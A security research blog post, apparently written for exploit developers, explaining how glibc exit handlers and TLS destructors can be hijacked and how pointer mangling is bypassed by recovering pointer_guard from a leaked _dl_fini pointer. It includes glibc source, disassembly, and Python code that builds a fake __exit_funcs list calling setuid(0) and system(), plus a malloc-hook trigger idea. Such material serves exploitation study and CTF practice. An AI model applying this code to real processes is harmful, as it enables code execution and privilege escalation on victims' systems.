@@ -1,0 +1,622 @@
+Hi,
+
+Today we’ll talk about abusing exit handlers in order to hijack the control flow.
+
+This research stemmed from Google Project Zero article about heap overflow NULL byte poisoning where they described using \_\_exit_funcs or tls_dtor_list to achieve code execution. The issue I had was to find a way to resolve reliably these non-exported symbols and access them.
+
+The exit handlers are quite interesting as it is an easy version to do ROP as they all take one parameter. Functions such as setuid(), system() or other functions needing 1 parameter can thus be easily called.
+
+Pointer mangling is a mitigation implemented in order to thwart direct function pointer corruption. I’ll show in this post how it can be bypassed.
+
+We’ll first analyze the code leading to the execution of these exit handlers and then show how to trigger them. There will be a lot of pasted listing ahead, these will be explained as we go.
+
+Where is the code leading to executing these exit handlers?
+
+# About exit ()
+
+Whenever we call libc exit(), it calls all the handlers we registered with atexit() and on_exit() before calling the \_exit() syscall.
+
+This is located in “glibc/stdlib/exit.c”.
+
+``` c
+void
+exit (int status)
+{
+  __run_exit_handlers (status, &__exit_funcs, true, true);
+}
+```
+
+exit() is just a nicely named wrapper for “\_\_run_exit_handlers()”.
+
+Let’s look at \_\_run_exit_handlers():
+
+``` c
+/* Call all functions registered with `atexit' and `on_exit',
+   in the reverse of the order in which they were registered
+   perform stdio cleanup, and terminate program execution with STATUS.  */
+void
+attribute_hidden
+__run_exit_handlers (int status, struct exit_function_list **listp,
+       bool run_list_atexit, bool run_dtors)
+{
+  /* First, call the TLS destructors.  */
+#ifndef SHARED
+  if (&__call_tls_dtors != NULL)
+#endif
+    if (run_dtors)
+      __call_tls_dtors ();
+
+  /* We do it this way to handle recursive calls to exit () made by
+     the functions registered with `atexit' and `on_exit'. We call
+     everyone on the list and use the status value in the last
+     exit (). */
+  while (*listp != NULL)
+    {
+      struct exit_function_list *cur = *listp;
+
+      while (cur->idx > 0)
+ {
+   const struct exit_function *const f =
+     &cur->fns[--cur->idx];
+   switch (f->flavor)
+     {
+       void (*atfct) (void);
+       void (*onfct) (int status, void *arg);
+       void (*cxafct) (void *arg, int status);
+
+     case ef_free:
+     case ef_us:
+       break;
+     case ef_on:
+       onfct = f->func.on.fn;
+#ifdef PTR_DEMANGLE
+       PTR_DEMANGLE (onfct);
+#endif
+       onfct (status, f->func.on.arg);
+       break;
+     case ef_at:
+       atfct = f->func.at;
+#ifdef PTR_DEMANGLE
+       PTR_DEMANGLE (atfct);
+#endif
+       atfct ();
+       break;
+     case ef_cxa:
+       cxafct = f->func.cxa.fn;
+#ifdef PTR_DEMANGLE
+       PTR_DEMANGLE (cxafct);
+#endif
+       cxafct (f->func.cxa.arg, status);
+       break;
+     }
+ }
+
+      *listp = cur->next;
+      if (*listp != NULL)
+ /* Don't free the last element in the chain, this is the statically
+    allocate element.  */
+ free (cur);
+    }
+
+  if (run_list_atexit)
+    RUN_HOOK (__libc_atexit, ());
+
+  _exit (status);
+}
+```
+
+We can see that “\_\_run_exit_handlers()” does use pointer demangling by using PTR_DEMANGLE() before dereferencing the function pointers and calling the pointed code. We will thus need to analyze how the mangling and demangling is done in order to bypass it.
+
+We first see that it tries to call “\_\_call_tls_dtors()”, this is interesting as this called function is used to call destructors in tls_dtor_list, we’ll come back to it.
+
+Let’s look what a ‘struct exit_function_list’ look like.
+
+This is located in “glibc/stdlib/exit.h”.
+
+``` c
+enum
+{
+  ef_free, /* `ef_free' MUST be zero!  */
+  ef_us,
+  ef_on,
+  ef_at,
+  ef_cxa
+};
+
+struct exit_function
+  {
+    /* `flavour' should be of type of the `enum' above but since we need
+       this element in an atomic operation we have to use `long int'.  */
+    long int flavor;
+    union
+      {
+ void (*at) (void);
+ struct
+   {
+     void (*fn) (int status, void *arg);
+     void *arg;
+   } on;
+ struct
+   {
+     void (*fn) (void *arg, int status);
+     void *arg;
+     void *dso_handle;
+   } cxa;
+      } func;
+  };
+struct exit_function_list
+  {
+    struct exit_function_list *next;
+    size_t idx;
+    struct exit_function fns[32];
+  };
+```
+
+Each handler can have 5 flavors : ef_free, ef_us, ef_on, ef_at and ef_cxa. Depending on the flavor of the exit handler, we’ll have a function pointer, argument and/or dso handle. The function list can store at most 32 handlers and a linked list is created if more is needed. idx is the total number of functions and is 1-based (not 0-based as usually).
+
+And our PTR_MANGLE() and PTR_DEMANGLE() definitions in “sysdeps/unix/sysv/linux/x86_64/sysdep.h”.
+
+``` c
+#  define PTR_MANGLE(var) asm ("xor %%fs:%c2, %0\n"        \
+         "rol $2*" LP_SIZE "+1, %0"        \
+         : "=r" (var)         \
+         : "0" (var),         \
+           "i" (offsetof (tcbhead_t,       \
+            pointer_guard)))
+#  define PTR_DEMANGLE(var) asm ("ror $2*" LP_SIZE "+1, %0\n"       \
+         "xor %%fs:%c2, %0"         \
+         : "=r" (var)         \
+         : "0" (var),         \
+           "i" (offsetof (tcbhead_t,       \
+            pointer_guard)))
+```
+
+Here we can see that it uses the “pointer_guard” offset in the structure “tcbhead_t” in order to access the pointer_guard in fs, this will be fs:0x30 on 64-bits machines.
+
+The assembly of “\_\_run_exit_handlers()”.
+
+``` text
+pwndbg> disassemble __run_exit_handlers
+Dump of assembler code for function __run_exit_handlers:
+   0x0000000000039f10 <+0>: push   r13
+   0x0000000000039f12 <+2>: push   r12
+   0x0000000000039f14 <+4>: mov    r12d,edx
+   0x0000000000039f17 <+7>: push   rbp
+   0x0000000000039f18 <+8>: push   rbx
+   0x0000000000039f19 <+9>: mov    rbp,rsi
+   0x0000000000039f1c <+12>: mov    ebx,edi
+   0x0000000000039f1e <+14>: sub    rsp,0x8
+   0x0000000000039f22 <+18>: call   0x3a5c0 <__gi___call_tls_dtors>
+   0x0000000000039f27 <+23>: mov    r13,QWORD PTR [rbp+0x0]
+   0x0000000000039f2b <+27>: test   r13,r13
+   0x0000000000039f2e <+30>: je     0x39f80 <__run_exit_handlers>
+   0x0000000000039f30 <+32>: mov    rax,QWORD PTR [r13+0x8]
+   0x0000000000039f34 <+36>: mov    rdx,rax
+   0x0000000000039f37 <+39>: shl    rdx,0x5
+   0x0000000000039f3b <+43>: test   rax,rax
+   0x0000000000039f3e <+46>: lea    rcx,[r13+rdx*1-0x10]
+   0x0000000000039f43 <+51>: je     0x39f6f <__run_exit_handlers>
+   0x0000000000039f45 <+53>: sub    rax,0x1
+   0x0000000000039f49 <+57>: mov    QWORD PTR [r13+0x8],rax
+   0x0000000000039f4d <+61>: mov    rdx,QWORD PTR [rcx]
+   0x0000000000039f50 <+64>: cmp    rdx,0x3
+   0x0000000000039f54 <+68>: je     0x3a000 <__run_exit_handlers>
+ ; ef_cxa
+   0x0000000000039f5a <+74>: cmp    rdx,0x4
+   0x0000000000039f5e <+78>: je     0x39fd8 <__run_exit_handlers>
+
+   0x0000000000039f60 <+80>: cmp    rdx,0x2
+   0x0000000000039f64 <+84>: je     0x39fb0 <__run_exit_handlers>
+   0x0000000000039f66 <+86>: sub    rcx,0x20
+   0x0000000000039f6a <+90>: test   rax,rax
+   0x0000000000039f6d <+93>: jne    0x39f45 <__run_exit_handlers>
+   0x0000000000039f6f <+95>: mov    rax,QWORD PTR [r13+0x0]
+   0x0000000000039f73 <+99>: test   rax,rax
+   0x0000000000039f76 <+102>: mov    QWORD PTR [rbp+0x0],rax
+   0x0000000000039f7a <+106>: jne    0x3a01d <__run_exit_handlers>
+   0x0000000000039f80 <+112>: test   r12b,r12b
+   0x0000000000039f83 <+115>: je     0x39fa4 <__run_exit_handlers>
+   0x0000000000039f85 <+117>: lea    rbp,[rip+0x38594c]        # 0x3bf8d8 <__elf_set___libc_atexit_element__io_cleanup__>
+   0x0000000000039f8c <+124>: lea    r12,[rip+0x38594d]        # 0x3bf8e0 <__elf_set___libc_thread_subfreeres_element_arena_thread_freeres__>
+   0x0000000000039f93 <+131>: cmp    rbp,r12
+   0x0000000000039f96 <+134>: jae    0x39fa4 <__run_exit_handlers>
+   0x0000000000039f98 <+136>: call   QWORD PTR [rbp+0x0]
+   0x0000000000039f9b <+139>: add    rbp,0x8
+   0x0000000000039f9f <+143>: cmp    rbp,r12
+   0x0000000000039fa2 <+146>: jb     0x39f98 <__run_exit_handlers>
+   0x0000000000039fa4 <+148>: mov    edi,ebx
+   0x0000000000039fa6 <+150>: call   0xcbb60 <__gi__exit>
+   0x0000000000039fab <+155>: nop    DWORD PTR [rax+rax*1+0x0]
+   0x0000000000039fb0 <+160>: shl    rax,0x5
+   0x0000000000039fb4 <+164>: mov    edi,ebx
+   0x0000000000039fb6 <+166>: add    rax,r13
+   0x0000000000039fb9 <+169>: mov    rdx,QWORD PTR [rax+0x18]
+   0x0000000000039fbd <+173>: mov    rsi,QWORD PTR [rax+0x20]
+   0x0000000000039fc1 <+177>: ror    rdx,0x11
+   0x0000000000039fc5 <+181>: xor    rdx,QWORD PTR fs:0x30
+   0x0000000000039fce <+190>: call   rdx
+   0x0000000000039fd0 <+192>: jmp    0x39f30 <__run_exit_handlers>
+   0x0000000000039fd5 <+197>: nop    DWORD PTR [rax]
+
+ ; ef_cxa
+   0x0000000000039fd8 <+200>: shl    rax,0x5
+   0x0000000000039fdc <+204>: mov    esi,ebx
+   0x0000000000039fde <+206>: add    rax,r13
+   0x0000000000039fe1 <+209>: mov    rdx,QWORD PTR [rax+0x18]
+   0x0000000000039fe5 <+213>: mov    rdi,QWORD PTR [rax+0x20]
+   0x0000000000039fe9 <+217>: ror    rdx,0x11
+   0x0000000000039fed <+221>: xor    rdx,QWORD PTR fs:0x30
+   0x0000000000039ff6 <+230>: call   rdx
+   0x0000000000039ff8 <+232>: jmp    0x39f30 <__run_exit_handlers>
+   0x0000000000039ffd <+237>: nop    DWORD PTR [rax]
+   0x000000000003a000 <+240>: shl    rax,0x5
+   0x000000000003a004 <+244>: mov    rax,QWORD PTR [r13+rax*1+0x18]
+   0x000000000003a009 <+249>: ror    rax,0x11
+   0x000000000003a00d <+253>: xor    rax,QWORD PTR fs:0x30
+   0x000000000003a016 <+262>: call   rax
+   0x000000000003a018 <+264>: jmp    0x39f30 <__run_exit_handlers>
+   0x000000000003a01d <+269>: mov    rdi,r13
+   0x000000000003a020 <+272>: call   0x1f8a8
+   0x000000000003a025 <+277>: jmp    0x39f27 <__run_exit_handlers>
+End of assembler dump.
+```
+
+In case you missed it, the code that really interest us is this:
+
+``` text
+   0x0000000000039fe9 <+217>: ror    rdx,0x11
+   0x0000000000039fed <+221>: xor    rdx,QWORD PTR fs:0x30
+   0x0000000000039ff6 <+230>: call   rdx
+```
+
+So what’s stored at fs:X? Let’s look at Thread Control Block.
+
+# About Thread Control Block
+
+Like we saw in PTR_MANGLE() and PTR_DEMANGLE(), it all has to do with the structure “tcbhead_t”. This structure is what’s stored at FS, which correspond to the per thread data (TCB probably for Thread Control Block).
+
+So at fs:0x30 we get the pointer_guard.
+
+It’s the pointer guard as defined in “sysdeps/x86_64/nptl/tls.h” in the structure “tcbhead_t”.
+
+``` c
+typedef struct
+{
+  void *tcb;  /* Pointer to the TCB.  Not necessarily the
+      thread descriptor used by libpthread.  */
+  dtv_t *dtv;
+  void *self;  /* Pointer to the thread descriptor.  */
+  int multiple_threads;
+  int gscope_flag;
+  uintptr_t sysinfo;
+  uintptr_t stack_guard;
+  uintptr_t pointer_guard;
+  unsigned long int vgetcpu_cache[2];
+# ifndef __ASSUME_PRIVATE_FUTEX
+  int private_futex;
+# else
+  int __glibc_reserved1;
+# endif
+  int __glibc_unused1;
+  /* Reservation of some values for the TM ABI.  */
+  void *__private_tm[4];
+  /* GCC split stack support.  */
+  void *__private_ss;
+  long int __glibc_reserved2;
+  /* Must be kept even if it is no longer used by glibc since programs,
+     like AddressSanitizer, depend on the size of tcbhead_t.  */
+  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));
+
+  void *__padding[8];
+} tcbhead_t;
+```
+
+# Where is that pointer_guard setted up?
+
+It’s setted up in “csu/libc-start.c”.
+
+``` c
+  /* Set up the pointer guard value.  */
+  uintptr_t pointer_chk_guard = _dl_setup_pointer_guard (_dl_random,
+        stack_chk_guard);
+# ifdef THREAD_SET_POINTER_GUARD
+  THREAD_SET_POINTER_GUARD (pointer_chk_guard);
+# else
+  __pointer_chk_guard_local = pointer_chk_guard;
+# endif
+```
+
+We could go look the code at “\_dl_setup_pointer_guard()” but research was not done there.
+
+We still need to determine where we can hit and overwrite these handlers. Let’s start with \_\_exit_funcs.
+
+# About atexit() and finding \_\_exit_funcs
+
+The “atexit()” code is located in “cxa_atexit.c”
+
+``` c
+/* Register a function to be called by exit or when a shared library
+   is unloaded.  This function is only called from code generated by
+   the C++ compiler.  */
+int
+__cxa_atexit (void (*func) (void *), void *arg, void *d)
+{
+  return __internal_atexit (func, arg, d, &__exit_funcs);
+}
+ibc_hidden_def (__cxa_atexit)
+```
+
+And the corresponding assembly.
+
+``` text
+pwndbg> disassemble __cxa_atexit 
+Dump of assembler code for function __GI___cxa_atexit:
+   0x000000000003a280 <+0>: push   r12
+   0x000000000003a282 <+2>: push   rbp
+   0x000000000003a283 <+3>: mov    r12,rsi
+   0x000000000003a286 <+6>: push   rbx
+   0x000000000003a287 <+7>: mov    rbx,rdi
+   0x000000000003a28a <+10>: lea    rdi,[rip+0x389367]        # 0x3c35f8 <__exit_funcs>
+   0x000000000003a291 <+17>: mov    rbp,rdx
+   0x000000000003a294 <+20>: call   0x3a0a0 <__new_exitfn>
+   0x000000000003a299 <+25>: test   rax,rax
+   0x000000000003a29c <+28>: je     0x3a2c8 <__gi___cxa_atexit>
+   0x000000000003a29e <+30>: mov    rdi,rbx
+   0x000000000003a2a1 <+33>: mov    QWORD PTR [rax+0x10],r12
+   0x000000000003a2a5 <+37>: mov    QWORD PTR [rax+0x18],rbp
+   0x000000000003a2a9 <+41>: xor    rdi,QWORD PTR fs:0x30
+   0x000000000003a2b2 <+50>: rol    rdi,0x11
+   0x000000000003a2b6 <+54>: mov    QWORD PTR [rax+0x8],rdi
+   0x000000000003a2ba <+58>: mov    QWORD PTR [rax],0x4
+   0x000000000003a2c1 <+65>: xor    eax,eax
+   0x000000000003a2c3 <+67>: pop    rbx
+   0x000000000003a2c4 <+68>: pop    rbp
+   0x000000000003a2c5 <+69>: pop    r12
+   0x000000000003a2c7 <+71>: ret    
+   0x000000000003a2c8 <+72>: mov    eax,0xffffffff
+   0x000000000003a2cd <+77>: jmp    0x3a2c3 <__gi___cxa_atexit>
+End of assembler dump.</__gi___cxa_atexit></__gi___cxa_atexit></__new_exitfn></__exit_funcs>
+```
+
+What’s interesting is “\_\_exit_funcs” being used. “\_\_exit_funcs” is an un-exported function but we can resolve it by disassembling that piece of assembly with capstone and retrieving the needed VA. “\_\_cxa_atexit()” is an exported symbol so we can retrieve the VA easily using pwntools.elf.ELF. You can see at VA 0x3a28a that it calculates the address of “\_\_exit_funcs”.
+
+Here is the code I wrote to do just that:
+
+``` python
+# get __exit_funcs addr
+def get_exit_funcs (code, off = 0):
+    md = Cs (CS_ARCH_X86, CS_MODE_64)
+    md.detail = True
+
+    # look for ptr offset
+    ptr_exit_funcs = None
+    for inst in md.disasm (code[off:], off):
+        if inst.mnemonic != 'lea':
+            continue
+        for operand in inst.operands:
+
+            if operand.type == x86.X86_OP_MEM:
+                if inst.reg_name (operand.value.mem.base) != 'rip':
+                    continue
+                ptr_exit_funcs = inst.address + inst.size + operand.value.mem.disp
+                break
+        if ptr_exit_funcs:
+            break
+
+    if ptr_exit_funcs is None:
+        return None
+    return ptr_exit_funcs
+```
+
+I’ll show at the end of the article how to use it to bypass pointer mangling. Let’s first have a look at tls_dtor_list.
+
+# About \_\_call_tls_dtors() and finding tls_dtor_list
+
+I was talking about “\_\_call_tls_dtors()” being an interesting piece of code to look at.
+
+``` c
+/* Call the destructors.  This is called either when a thread returns from the
+   initial function or when the process exits via the exit function.  */
+void
+__call_tls_dtors (void)
+{
+  while (tls_dtor_list)
+    {
+      struct dtor_list *cur = tls_dtor_list;
+      dtor_func func = cur->func;
+#ifdef PTR_DEMANGLE
+      PTR_DEMANGLE (func);
+#endif
+
+      tls_dtor_list = tls_dtor_list->next;
+      func (cur->obj);
+
+      /* Ensure that the MAP dereference happens before
+  l_tls_dtor_count decrement.  That way, we protect this access from a
+  potential DSO unload in _dl_close_worker, which happens when
+  l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */
+      atomic_fetch_add_release (&cur->map->l_tls_dtor_count, -1);
+      free (cur);
+    }
+}
+```
+
+The part that really interest us is about tls_dtor_list being used.
+
+The corresponding assembly.
+
+``` text
+pwndbg> disassemble __GI___call_tls_dtors
+Dump of assembler code for function __GI___call_tls_dtors:
+   0x000000000003a5c0 <+0>: push   rbp
+   0x000000000003a5c1 <+1>: push   rbx
+   0x000000000003a5c2 <+2>: sub    rsp,0x8
+   0x000000000003a5c6 <+6>: mov    rbp,QWORD PTR [rip+0x3887b3]        # 0x3c2d80
+   0x000000000003a5cd <+13>: mov    rbx,QWORD PTR fs:[rbp+0x0]
+   0x000000000003a5d2 <+18>: test   rbx,rbx
+   0x000000000003a5d5 <+21>: je     0x3a61e <__gi___call_tls_dtors>
+   0x000000000003a5d7 <+23>: nop    WORD PTR [rax+rax*1+0x0]
+   0x000000000003a5e0 <+32>: mov    rdx,QWORD PTR [rbx+0x18]
+   0x000000000003a5e4 <+36>: mov    rax,QWORD PTR [rbx]
+   0x000000000003a5e7 <+39>: mov    rdi,QWORD PTR [rbx+0x8]
+   0x000000000003a5eb <+43>: ror    rax,0x11
+   0x000000000003a5ef <+47>: xor    rax,QWORD PTR fs:0x30
+   0x000000000003a5f8 <+56>: mov    QWORD PTR fs:[rbp+0x0],rdx
+   0x000000000003a5fd <+61>: call   rax
+   0x000000000003a5ff <+63>: mov    rax,QWORD PTR [rbx+0x10]
+   0x000000000003a603 <+67>: lock sub QWORD PTR [rax+0x450],0x1
+   0x000000000003a60c <+76>: mov    rdi,rbx
+   0x000000000003a60f <+79>: call   0x1f8a8
+   0x000000000003a614 <+84>: mov    rbx,QWORD PTR fs:[rbp+0x0]
+   0x000000000003a619 <+89>: test   rbx,rbx
+   0x000000000003a61c <+92>: jne    0x3a5e0 <__gi___call_tls_dtors>
+   0x000000000003a61e <+94>: add    rsp,0x8
+   0x000000000003a622 <+98>: pop    rbx
+   0x000000000003a623 <+99>: pop    rbp
+   0x000000000003a624 <+100>: ret    
+End of assembler dump.</__gi___call_tls_dtors></__gi___call_tls_dtors>
+```
+
+You can see at VA 0x3a5c6 that it dereferences the pointer to tls_dtor_list. So we can disassemble that function and find that offset using capstone. “\_\_call_tls_dtors” is exported so the address can be easily parsed out using pwntools.elf.ELF.
+
+I didn’t write code for it but the idea is the same as for \_\_exit_funcs, this is left as an exercise to the reader.
+
+# Bypassing pointer mangling
+
+While playing with a binary challenge, I happened to see that \_dl_fini() is often registered in the \_\_exit_funcs array, so we can recalculate the pointer_guard value and thus bypass pointer mangling.
+
+The issue with “\_dl_fini()” is that it seems to be an un-exported symbol. I’ve found the address while digging in gdb. An elf parser probably has to be written to find “\_dl_fini()” address.
+
+A vulnerability that allows you to leak an encoded pointer in \_\_exit_funcs is also necessary. Here we use \_dl_fini encoded pointer.
+
+The formula to compute the pointer_guard assuming that “\_dl_fini()” is used is as follow:
+
+``` python
+ptr_guard = ror (ptr_encoded, 0x11, 64) ^ _dl_fini
+```
+
+Here the code you’ve been waiting for. We re-use “get_exit_funcs()” that was showed earlier.
+
+``` python
+# Rotate left: 0b1001 --> 0b0011
+rol = lambda val, r_bits, max_bits: \
+    (val << r_bits%max_bits) & (2**max_bits-1) | \
+    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
+ 
+# Rotate right: 0b1001 --> 0b1100
+ror = lambda val, r_bits, max_bits: \
+    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
+    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
+
+elf = ELF (libc_filename)
+
+# get libc data
+content = ''
+with open (libc_filename) as fp:
+    content = fp.read ()
+
+# get our exit_funcs address
+off_cxa_atexit = elf.symbols['__cxa_atexit']
+ptr_exit_funcs = libc_base + get_exit_funcs (content, off_cxa_atexit)
+off_exit_funcs = ptr_exit_funcs - start_data
+__exit_funcs = struct.unpack ('<Q', libc_data[off_exit_funcs:off_exit_funcs + 8])[0]
+# our encoded pointer location
+off_ptr_encoded = (__exit_funcs - start_data) + 24
+ptr_encoded = struct.unpack ('<Q', libc_data[off_ptr_encoded:off_ptr_encoded + 8])[0]
+# this is used to encode pointers
+ptr_guard = ror (ptr_encoded, 0x11, 64) ^ _dl_fini
+
+print '\n[+] Leak __exit_funcs'
+print 'start_data               : 0x%016x' % start_data
+print 'ptr_exit_funcs           : 0x%016x' % ptr_exit_funcs
+print 'exit_funcs               : 0x%016x' % __exit_funcs
+print 'off_ptr_encoded          : 0x%016x' % off_ptr_encoded
+print 'ptr_encoded              : 0x%016x' % ptr_encoded
+print 'ptr_guard                : 0x%016x' % ptr_guard
+```
+
+Now that we got the pointer_guard, what do we do?
+
+We craft a fake \_\_exit_funcs and corrupt the original \_\_exit_funcs.
+
+``` python
+class CxaFunc (object):
+    def __init__ (self, func, arg, ptr_guard):
+        self.func = func
+        self.arg = arg
+        self.ptr_guard = ptr_guard
+
+    def __str__ (self):
+        # flavor = 4 (ef_cxa) + func + arg + NULL (dso handle)
+        if self.ptr_guard:
+            encoded = rol (self.func ^ self.ptr_guard, 0x11, 64)
+        else:
+            encoded = self.func
+        print 'func : 0x%016x | encoded : 0x%016x | arg : 0x%016x' % (self.func, encoded, self.arg)
+  # ef_cxa == 4 | encoded function pointer | argument | dso handle set to NULL
+        data = struct.pack ('<Q', 4) + struct.pack ('<Q', encoded) + struct.pack ('<Q', self.arg) + struct.pack ('<Q', 0)
+        return data
+
+class ExitHandlers (object):
+    def __init__ (self, ptr_guard):
+        self.handlers = list ()
+        self.ptr_guard = ptr_guard
+
+    def append (self, func, arg):
+        cxafunc = CxaFunc (func, arg, self.ptr_guard)
+        self.handlers.append (cxafunc)
+
+    def __str__ (self):
+        fake_exit_funcs = ''
+        # next = NULL
+        fake_exit_funcs += struct.pack ('<Q', 0)
+        # idx = number of handlers
+        print 'Packing %d handlers' % len (self.handlers)
+        fake_exit_funcs += struct.pack ('<Q', len (self.handlers))
+        for cxafunc in self.handlers:
+            fake_exit_funcs += str (cxafunc)
+
+        return fake_exit_funcs
+
+# build our exit_funcs functions list
+fake_exit_funcs = ExitHandlers (ptr_guard)
+# setuid
+fake_exit_funcs.append (func_setuid, 0)
+# system and get cmd
+for heap_addr in heap_addrs:
+    fake_exit_funcs.append (func_system, heap_addr)
+fake_exit_funcs = str (fake_exit_funcs)
+```
+
+Given you’ve recalculated the proper pointer_guard … pointer mangling is bypassed.
+
+# Other (untested) ideas to get the pointer_guard?
+
+There probably is another way to get that pointer_guard given you’ve got an arbitrary infoleak. This may be possible through a pointer corruption or a UAF or Type Confusion or something else. If the attacker somehow manage to find where ‘struct tcbhead’ is located in memory, he may be able to just read the value out of it.
+
+Last idea is probably far fetched but let’s look at it. Let’s say you got an oracle : crash or not crash and that your process is respawned through a fork(). You could probably use techniques similar as those used for blind rop to guess the pointer guard. More research can be done there but we don’t need it for now.
+
+# About glibc ptmalloc hooks
+
+It may come a time where you somehow can’t manage to exit a program running as it may run in a infinite loop for example.
+
+In order to use our previous technique, the process has to call the libc exit() function. This happens when the process prepare to exit.
+
+We may be able to trigger that function before reaching the end of the program by using glibc ptmalloc hooks. In each glibc ptmalloc functions, there is a function pointer that is called given it’s not NULL. By over-writing one of these hooks with glibc exit() function and triggering the corresponding malloc(), free() or realloc() call, we’ll trigger the execution of our payload written in \_\_exit_funcs.
+
+These functions hook are all exported symbols that you can easily get with pwntools.elf.ELF : \_\_free_hook, \_\_malloc_hook, \_\_realloc_hook and \_\_memalign_hook.
+
+# Conclusion
+
+Full mitigations bypass is still possible nowadays on the latest Linux distribution given the proper vulnerabilities and binary. Every technique is applicable on a case-by-case basis. Pointer mangling was implemented in order to make destructors corruption exploitation harder, but as can be seen it’s not impossible.
+
+This technique is particularly useful when you don’t know where the stack is and you have full RELRO activated. It allows you to do an easy version of ROP.
+
+Cheers,
+
+m_101
+
+# References
+
+- The poisoned NULL byte, 2014 edition : <https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html>
+- Pointer Encryption : <https://sourceware.org/glibc/wiki/PointerEncryption>
